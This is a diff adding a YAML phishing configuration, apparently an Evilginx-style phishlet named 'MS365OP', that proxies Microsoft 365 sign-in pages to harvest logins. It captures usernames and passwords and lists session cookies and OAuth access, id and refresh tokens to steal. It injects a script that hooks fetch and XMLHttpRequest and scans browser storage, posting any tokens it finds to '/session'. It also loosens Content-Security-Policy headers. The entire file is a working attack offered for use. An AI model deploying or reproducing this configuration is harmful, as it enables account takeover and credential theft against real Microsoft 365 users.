@@ -1,0 +1,164 @@
+name: 'MS365OP'
+min_ver: '3.2.0'
+
+login:
+  domain: 'microsoftonline.com'
+  username_key: 'loginfmt'
+  password_key: 'passwd'
+  post: '/common/login'
+  success: '/kmsi'
+
+proxy_hosts:
+  - { phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: false }
+  - { phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: false, auto_filter: false }
+  - { phish_sub: 'aadimg', orig_sub: 'aadcdn', domain: 'msauthimages.net', session: false, is_landing: false, auto_filter: false }
+
+sub_filters:
+  - triggers_on: 'login.microsoftonline.com'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    mimes: ['text/html','application/javascript','application/x-javascript','application/json','text/javascript']
+    search: '{hostname}'
+    replace: '{hostname}'
+
+  - triggers_on: 'login.microsoftonline.com'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    mimes: ['text/html','application/javascript','application/json','text/javascript']
+    search: 'https://{hostname}'
+    replace: 'https://{hostname}'
+    redirect_only: true
+
+auth_urls:
+  - '/common/oauth2/v2.0/authorize'
+  - '/common/oauth2/v2.0/token'
+  - '/kmsi'
+  - '/login.srf'
+
+credentials:
+  username:
+    key: 'loginfmt'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+
+auth_tokens:
+  - domain: '.microsoftonline.com'
+    keys: ['ESTSAuth', 'ESTSAUTHPERSISTENT', 'ESTSAuth1']
+  - domain: '.office.com'
+    keys: ['OfficeAuth', 'OfficeAuthToken']
+
+custom:
+  - key: 'access_token'
+    search: '"access_token"\\s*:\\s*"([^"]+)"'
+    type: 'regex'
+  - key: 'id_token'
+    search: '"id_token"\\s*:\\s*"([^"]+)"'
+    type: 'regex'
+  - key: 'refresh_token'
+    search: '"refresh_token"\\s*:\\s*"([^"]+)"'
+    type: 'regex'
+
+inject:
+  - url_pattern: 'login.microsoftonline.com'
+    script: |
+      <script>
+      (function(){
+        function postToken(token){
+          if(!token) return;
+          try{
+            fetch('/session', {
+              method: 'POST',
+              headers: {'Content-Type':'application/json'},
+              body: JSON.stringify({access_token: token})
+            });
+          } catch(e){}
+        }
+
+        try {
+          var hash = window.location.hash || '';
+          var m = hash.match(/(?:access_token|id_token)=([^&]+)/i);
+          if (m && m[1]) { postToken(decodeURIComponent(m[1])); }
+
+          for (var i=0;i<sessionStorage.length;i++){
+            var k = sessionStorage.key(i);
+            var v = sessionStorage.getItem(k);
+            if (!v) continue;
+            var mm = v.match(/"access_token"\\s*:\\s*"([^"]+)"/i);
+            if (mm && mm[1]) { postToken(mm[1]); return; }
+            if (typeof v === 'string' && v.split('.').length === 3) { postToken(v); return; }
+          }
+
+          for (var i=0;i<localStorage.length;i++){
+            var k = localStorage.key(i);
+            var v = localStorage.getItem(k);
+            if (!v) continue;
+            var mm = v.match(/"access_token"\\s*:\\s*"([^"]+)"/i);
+            if (mm && mm[1]) { postToken(mm[1]); return; }
+            if (typeof v === 'string' && v.split('.').length === 3) { postToken(v); return; }
+          }
+
+          (function(origFetch){
+            window.fetch = function(){
+              return origFetch.apply(this, arguments).then(function(response){
+                try {
+                  var ct = response.headers && response.headers.get ? (response.headers.get('content-type')||'') : '';
+                  if (ct.indexOf('application/json') !== -1) {
+                    response.clone().json().then(function(j){
+                      if (j && (j.access_token || j.id_token)) {
+                        postToken(j.access_token || j.id_token);
+                      }
+                    });
+                  }
+                } catch(e){}
+                return response;
+              });
+            };
+          })(window.fetch);
+
+          (function(open){
+            XMLHttpRequest.prototype.open = function(){
+              this.addEventListener('load', function(){
+                try {
+                  var ct = this.getResponseHeader && this.getResponseHeader('Content-Type') || '';
+                  if (ct.indexOf('application/json') !== -1 && this.responseText) {
+                    try {
+                      var j = JSON.parse(this.responseText);
+                      if (j && (j.access_token || j.id_token)) {
+                        postToken(j.access_token || j.id_token);
+                      }
+                    } catch(e){}
+                  }
+                } catch(e){}
+              });
+              return open.apply(this, arguments);
+            };
+          })(XMLHttpRequest.prototype.open);
+
+        } catch (e) {
+          console.log('inject error', e);
+        }
+      })();
+      </script>
+
+csp_bypass:
+  - domain: 'login.microsoftonline.com'
+    headers:
+      - name: 'Content-Security-Policy'
+        value: "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;"
+  - domain: 'www.office.com'
+    headers:
+      - name: 'Content-Security-Policy'
+        value: "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;"
+  - domain: 'aadcdn.msauth.net'
+    headers:
+      - name: 'Content-Security-Policy'
+        value: "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;"
+  - domain: 'aadcdn.msauthimages.net'
+    headers:
+      - name: 'Content-Security-Policy'
+        value: "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;"
